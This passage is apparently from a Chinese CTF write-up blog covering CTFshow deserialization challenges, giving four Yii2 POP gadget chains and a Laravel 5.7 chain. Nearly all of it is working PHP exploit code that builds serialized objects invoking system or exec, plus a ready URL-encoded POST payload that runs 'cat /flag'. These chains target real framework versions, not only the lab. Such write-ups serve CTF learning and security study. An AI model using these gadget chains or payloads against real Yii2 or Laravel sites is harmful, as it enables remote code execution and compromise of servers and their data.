<h3 id="总结yii2框架四条链："><a href="#总结yii2框架四条链：" class="headerlink" title="总结yii2框架四条链："></a>总结yii2框架四条链：</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220322160748590.png" alt="image-20220322160748590"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113824239">yii2框架 反序列化漏洞复现</a></p>
<p>267-270分别使用如下链</p>
<p>四个pop链：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;dir&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> IndexAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader=<span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* 1.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> IndexAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span>-&gt;isRunning()，因为<span class="keyword">$this</span>-&gt;processes是我们可控的，因此<span class="variable">$process</span>也同样可控，所以这里调用isRunning方法，又可以触发__call，然后继续反序列化攻击</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;dir&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> IndexAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description=<span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path=<span class="keyword">new</span> See();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;description-&gt;render()可控</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* 1.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">DbSession</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader=<span class="keyword">new</span> DbSession();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$writeCallback</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="keyword">new</span> IndexAction();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback=[<span class="variable">$a</span>,<span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="keyword">$this</span>-&gt;writeCallback, <span class="keyword">$this</span>)，因为<span class="keyword">$this</span>-&gt;writeCallback可控，因此调用的回调函数可控，因此这里可以调用之前那条链里的run方法，实现RCE</span><br></pre></td></tr></table></figure>

<h3 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h3><p>laravel5.7反序列化漏洞</p>
<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220322171812777.png" alt="image-20220322171812777"></p>
<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220322171834927.png" alt="image-20220322171834927"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$test</span>;                 <span class="comment">//一个实例化的类 Illuminate\Auth\GenericUser</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;                   <span class="comment">//一个实例化的类 Illuminate\Foundation\Application</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;           <span class="comment">//要执行的php函数 system</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;     <span class="comment">//要执行的php函数的参数  array(&#x27;id&#x27;)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$instances</span> = []</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] = <span class="variable">$instances</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>(&quot;<span class="title">hello</span>&quot; =&gt; &quot;<span class="title">world</span>&quot;));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$app</span> = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> Illuminate\Foundation\Application(<span class="variable">$app</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<span class="variable">$defaultgenerator</span>, <span class="variable">$application</span>, <span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;cat /flag&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>post:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">data</span>=O%<span class="number">3</span>A<span class="number">44</span>%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CTesting%<span class="number">5</span>CPendingCommand%<span class="number">22</span>%<span class="number">3</span>A<span class="number">4</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">4</span>%<span class="number">3</span>A%<span class="number">22</span>test%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>Faker%<span class="number">5</span>CDefaultGenerator%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">10</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>default%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">5</span>%<span class="number">3</span>A%<span class="number">22</span>hello%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">5</span>%<span class="number">3</span>A%<span class="number">22</span>world%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A<span class="number">6</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>app%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">33</span>%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CApplication%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">12</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>instances%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">35</span>%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CContracts%<span class="number">5</span>CConsole%<span class="number">5</span>CKernel%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">33</span>%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CApplication%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">12</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>instances%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">35</span>%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CContracts%<span class="number">5</span>CConsole%<span class="number">5</span>CKernel%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A<span class="number">0</span>%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A<span class="number">10</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>command%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">6</span>%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">13</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>parameters%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A<span class="number">0</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">9</span>%<span class="number">3</span>A%<span class="number">22</span>cat+%<span class="number">2</span>Fflag%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<h3 id="web272-273"><a href="#web272-273" class="headerlink" title="web272-273"></a>web272-273</h3><p>Laravel 5.8 框架的反序列化漏洞。</p>
